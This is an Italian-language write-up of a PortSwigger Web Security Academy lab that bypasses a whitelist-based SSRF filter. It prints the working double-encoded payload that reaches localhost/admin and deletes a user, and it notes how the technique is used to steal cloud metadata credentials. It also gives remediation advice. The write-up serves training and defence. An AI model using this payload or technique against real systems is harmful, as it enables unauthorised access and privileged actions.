# Server-Side Request Forgery — Bypass di filtro whitelist

> **Autore:** Leonardo Onori — Junior Penetration Tester
> **Fonte:** PortSwigger Web Security Academy — *SSRF with whitelist-based input filter* (Mystery Lab)
> **Target:** `0a7f000d04aaf0d182edbacb007f006e.web-security-academy.net`
> **Categoria:** OWASP A10:2021 – SSRF · CWE-918
> **Severità:** High · **CVSS 3.1 (stimato):** 8.6

> 📄 Report tecnico completo in PDF: [`Report_SSRF.pdf`](./Report_SSRF.pdf)

---

## 1. Sintesi

La funzionalità *Check stock* effettua richieste HTTP lato server verso un URL fornito dall'utente (parametro `stockApi`), protetto da una whitelist sull'hostname. Il filtro è aggirabile sfruttando una **discrepanza di parsing dell'URL** (parser differential) tra il componente che valida l'host e quello che esegue la richiesta. Si forza così il server a contattare la propria interfaccia di loopback (`http://localhost/admin`) ed eseguire un'azione privilegiata: l'eliminazione dell'utente `carlos`.

| | |
|---|---|
| **Parametro vulnerabile** | `stockApi` (POST `/product/stock`) |
| **Difesa** | Whitelist hostname = `stock.weliketoshop.net` |
| **Fiducia implicita** | Richieste da loopback = admin |
| **Autenticazione richiesta** | Nessuna |

---

## 2. Contesto

La richiesta legittima della funzione *Check stock*:

```http
POST /product/stock HTTP/2
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

Il controllo d'accesso all'area admin risponde:

```
Admin interface only available if logged in as an administrator, or if requested from loopback
```

Il server considera quindi attendibile ogni richiesta proveniente da sé stesso (`127.0.0.1` / `localhost`).

## 3. Sviluppo dell'exploit (iterativo)

| # | Payload (host rilevante) | Risposta del server |
|---|---|---|
| 1 | `http://localhost/admin` | `400 — Illegal character in path at index 22` |
| 2 | `...net@localhost/admin` | `400 — External stock check host must be stock.weliketoshop.net` |
| 3 | `localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos` | **`302 Found`** (successo) |

- **Step 1** → esiste una fase di parsing esplicita prima dell'esecuzione.
- **Step 2** → il parser supporta le credenziali embedded (`user@host`), ma la whitelist filtra sull'host reale (`localhost`), quindi la `@` da sola non basta.
- **Step 3** → doppia codifica di `#` (`%23` → `%2523`) per creare la divergenza di parsing.

## 4. Payload finale

Valore del parametro `stockApi` (in chiaro):

```
http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

Corpo della richiesta (URL-encoded):

```
stockApi=http%3A%2F%2Flocalhost%3A80%2523%40stock.weliketoshop.net%2Fadmin%2Fdelete%3Fusername%3Dcarlos
```

## 5. Meccanismo del bypass (parser differential)

| Fase | Interpretazione | Host percepito | Esito |
|---|---|---|---|
| **Validazione** (whitelist) | `%2523` resta `%23` → `...%23@stock.weliketoshop.net/...` ; la `@` rende userinfo tutto ciò che precede | `stock.weliketoshop.net` | ✓ whitelist superata |
| **Esecuzione** (richiesta HTTP) | ulteriore decode → `%2523` diventa `#` → `http://localhost:80#@...` ; il `#` tronca il resto come frammento | `localhost:80` | richiesta verso loopback |

Il validatore vede `stock.weliketoshop.net` e approva; il fetcher vede `localhost` e vi si connette. La richiesta parte dal server, quindi l'area admin la autorizza come loopback.

## 6. Prova dello sfruttamento

```http
HTTP/2 302 Found
Location: /admin
```

Il redirect `302` verso `/admin` è la risposta prodotta dopo una cancellazione riuscita: l'utente `carlos` risulta eliminato.

## 7. Impatto

Un attaccante non autenticato può aggirare il controllo d'accesso amministrativo, eseguire azioni privilegiate (cancellazione arbitraria di account) e raggiungere servizi interni (movimento laterale). In ambienti cloud la stessa tecnica è usata per interrogare gli endpoint dei metadati (es. `169.254.169.254`) e sottrarre credenziali temporanee.

## 8. Remediation

- Normalizzare e risolvere l'URL **una sola volta**, validando l'host sulla forma risolta: validatore e fetcher devono usare lo stesso URL.
- Allow-list basata sull'**IP risolto**, con blocco esplicito di loopback (`127.0.0.0/8`, `::1`), link-local (`169.254.0.0/16`) e reti private (RFC 1918).
- Vietare credenziali embedded e frammenti negli URL server-side; rifiutare sequenze di codifica multipla.
- Non basare l'autorizzazione sulla provenienza di rete; segmentare l'egress del servizio.

## 9. Riferimenti

- OWASP Top 10 — A10:2021 Server-Side Request Forgery
- CWE-918 — Server-Side Request Forgery
- PortSwigger Web Security Academy — *SSRF with whitelist-based input filter*
